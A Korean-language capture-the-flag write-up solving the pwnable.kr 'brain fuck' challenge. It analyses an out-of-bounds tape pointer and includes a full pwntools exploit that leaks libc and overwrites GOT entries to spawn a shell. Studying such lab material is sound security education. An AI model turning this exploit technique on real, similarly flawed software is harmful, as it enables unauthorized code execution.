# [pwnable.kr] brain fuck writeup



#### [summary] vulnerability pointer, got overwrite

```shell
I made a simple brain-fuck language emulation program written in C. 
The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
Find a bug and exploit it to get a shell. 

Download : http://pwnable.kr/bin/bf
Download : http://pwnable.kr/bin/bf_libc.so

Running at : nc pwnable.kr 9001
```

brain fuck ㅇㅅㅇ

wsl에서는 32bit 바이너리가 실행이 안돼서 오랜만에 vm을 켰다.

```shell
$ fild bf
bf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=190d45832c271de25448cefe52fbd15ea9ed5e65, not stripped
$ checksec bf
[*] '/home/ch4rli3kop/pwnkr/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

canary가 있음!

### analysis

#### main()

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t i; // [esp+28h] [ebp-40Ch]
  char s[1024]; // [esp+2Ch] [ebp-408h]
  unsigned int v6; // [esp+42Ch] [ebp-8h]

  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(s, 0, 0x400u);
  fgets(s, 0x400, stdin);
  for ( i = 0; i < strlen(s); ++i )
    do_brainfuck(s[i]);
  return 0;
}
```

별거 없다. 로컬 변수 s에 사용자의 입력을 받고, `do_brainfuck()`을 통해 각 문자에따라 해당하는 동작을 수행한다. 사용되는 전역 변수 p와 tape는 다음과 같이 .bss 영역에 존재한다.

```shell
gdb-peda$ x/40wx 0x804a000
0x804a000:	0x08049f14	0xf7f26918	0xf7f17000	0x08048446
0x804a010 <fgets@got.plt>:	0xf7da4150	0x08048466	0xf7da5ca0	0x08048486
0x804a020 <strlen@got.plt>:	0xf7dc4440	0xf7d5e540	0xf7da6360	0xf7e6bb50
0x804a030 <putchar@got.plt>:	0x080484d6	0x00000000	0x00000000	0x00000000
0x804a040 <stdin@@GLIBC_2.0>:	0xf7ef85a0	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060 <stdout@@GLIBC_2.0>:	0xf7ef8d60	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a080 <p>:	0x0804a09f	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0 <tape>:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0 <tape+16>:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0 <tape+32>:	0x00000000	0x00000000	0x00000000	0x00000000
```



#### do_brainfuck()

```c
int __cdecl do_brainfuck(char a1)
{
  int result; // eax
  _BYTE *v2; // ebx

  result = a1;
  switch ( a1 )
  {
    case '+':
      result = p;
      ++*(_BYTE *)p;
      break;
    case ',':
      v2 = (_BYTE *)p;
      result = getchar();
      *v2 = result;
      break;
    case '-':
      result = p;
      --*(_BYTE *)p;
      break;
    case '.':
      result = putchar(*(char *)p);
      break;
    case '<':
      result = p-- - 1;
      break;
    case '>':
      result = p++ + 1;
      break;
    case '[':
      result = puts("[ and ] not supported.");
      break;
    default:
      return result;
  }
  return result;
}
```

가장 원초적인 취약점은 `'<'`와 `'>'`를 만났을 때 발생한다. pointer의 범위가 `tape`에서 `p`를 넘어 GOT까지 도달할 수 있어, `getchar()`를 이용하여 1 byte 씩 덮어쓸 수 있다.

포인터를 `stdin`에 놓고 `putchar()`를 이용하여 libc 주소를 릭하고, `putchar()`의 GOT를 `main()`으로 덮어씌워서 `main()`을 다시 실행하도록 했다.

이제 구한 libc를 통해 `system("/bin/sh")`를 호출하도록 되게 해야하는데, 어떻게 할까하다가 두 번째 `main()`에서  `__stack_chk_fail()`을 `system()`으로 덮고, `fgets()`를 `gets()`로 덮기로 했다.

 `__stack_chk_fail()`에 대해서는, for 문을 지나고 canary 체크를 하는데 `strlen()`의 인자로 사용했던 영향인지 esp에 `fgets()`로 입력받은 로컬 변수 s의 주소가 저장되어 `system()`으로 덮었을 때 인자문제를 해결할 수 있다.

`fgets()`를 `gets()`로 덮는 이유는 canary를 덮어씌워 `__stack_chk_fail()`이 실행되게 하기 위함이다.

두 번째 `main()`에서도 마찬가지로 위의 동작을 수행한 뒤 아까 덮었던 `'.'`을 이용하여 다시 `main()`으로 돌아가면 이제 세 번째 `main()`이다.

세 번째 `main()`에서는 `s`에 `fgets()`(이제 `gets()`)로 입력을 받을 때 `"/bin/sh;"`를 앞에 두고 canary를 덮을만큼 충분한 값을 주면 세 번째 `main()`이 종료되면서 `__stack_chk_fail()`을 호출하여 최종적으로 `system("/bin/sh;~~~")`를 실행시킬 수 있다.

#### exploit

```python
#/usr/bin/python
from pwn import *

context.log_level='debug'
r = process('./bf', env={'LD_PRELOAD':'./bf_libc.so'})
#r = remote('pwnable.kr', 9001)
gdb.attach(r, 'b* 0x0804875b')
r.recvuntil('[ ]\n')

'''
.got.plt:0804A010 off_804A010     dd offset fgets 
.got.plt:0804A014 off_804A014     dd offset __stack_chk_fail
.got.plt:0804A030 off_804A030     dd offset putchar  
.bss:0804A040 stdin@@GLIBC_2_0
.bss:0804A080 p  
.bss:0804A0A0 tape  

main 08048671
'''

payload = ''
## libc leak ##
payload += '<'*(0x0804A0A0-0x0804A040-3)
payload += '.'
payload += '<'
payload += '.'
payload += '<'
payload += '.'
payload += '<'
payload += '.'
## putchar overwrite to return main ##
payload += '<'*(0x10-3)
payload += ',' # 0x71
payload += '<'
payload += ',' # 0x86
payload += '<'
payload += ',' # 0x04
payload += '<'
payload += ',' # 0x08
## return main()
payload += '.'

r.sendline(payload)

libc = 0
for i in range(4):
	libc += (ord(r.recv(1)) & 0xff) << (0x8*(3-i))

success('leak = '+hex(libc))
libc -= 0x1b25a0
log.info('libc_base = '+hex(libc))
system = libc + 0x3ada0
log.info('system = '+hex(system))
gets = libc + 0x5f3e0
log.info('gets = '+hex(gets))

r.send(chr(0x08))
r.send(chr(0x04))
r.send(chr(0x86))
r.send(chr(0x71))

r.recvuntil('[ ]\n')

payload = ''
payload += '<'*(0x0804A0A0-0x0804A014-3)
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
## fgets -> gets
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
payload += '<'
payload += ','
## return main()
payload += '.'

r.sendline(payload)

r.send(chr( (system >> 0x8*3) & 0xff ))
r.send(chr( (system >> 0x8*2) & 0xff ))
r.send(chr( (system >> 0x8*1) & 0xff ))
r.send(chr( (system >> 0x8*0) & 0xff ))

r.send(chr( (gets >> 0x8*3) & 0xff ))
r.send(chr( (gets >> 0x8*2) & 0xff ))
r.send(chr( (gets >> 0x8*1) & 0xff ))
r.send(chr( (gets >> 0x8*0) & 0xff ))

r.recvuntil('[ ]\n')

payload = '/bin/sh;'
payload += 'z'*0x400

r.sendline(payload)

r.interactive()
```

#### result

```shell
$ id
uid=1035(brainfuck) gid=1035(brainfuck) groups=1035(brainfuck)
$ cat flag
BrainFuck? what a weird language..
```



취약점은 간단함에도 불구하고 익스하는데 오래걸린 문제...

이상한데 꽂혀서 좀 엉뚱하게 풀었다..

힘겹게 풀고난 뒤 다른 사람들의 풀이를 보니 좀 마음이 아팠다.

`memset()`을 `gets()`로 덮고, `fgets()`를 `system()`으로 덮을 줄이야...

이렇게 간단한 방법이 있어서 좀 슬프지만 갑자기 카나리에 꽂혀서 저렇게 풀 수 밖에 없었다라는 나름의 변명을 해본다.



암튼 풀면서 겪은 어려움들을 서술해보도록 하자.

1. system 인자로 주는게 문제였다. one_gadget을 열심히 시도해보았지만, 조건들에 다 안맞아서 fail...

2. `case '.': result = putchar(*(char *)p);` 요녀석을 어떻게 공략해보려 했지만, 요 깜찍한 녀석이 한 바이트만 가져와서 인자로 사용할 수 가 없었다..

   ```assembly
   .text:0804863A                 mov     eax, ds:p       
   .text:0804863F                 movzx   eax, byte ptr [eax]
   .text:08048642                 movsx   eax, al
   .text:08048645                 mov     [esp], eax 
   .text:08048648                 call    _putchar
   ```

3. `strlen()`을 `system()`으로 덮는걸 해보려 했지만, 1 byte씩 덮는 바람에 fail... 이것때문에 `getchar()`를 `gets()` 같은거로 덮어서 해보려 했지만, 인자를 사용안해서 문제가 생길듯..(사실 뇌피셜)

4. 위와 마찬가지로 `strlen()`을 덮는 방법인데, 1 byte 만으로 어떻게 시도할 수 있는 함수가 없나 찾아봄. fail.. `strlen()`이 PLT가 저장되어 있었다면 가능한 방법임(사실상 불가능)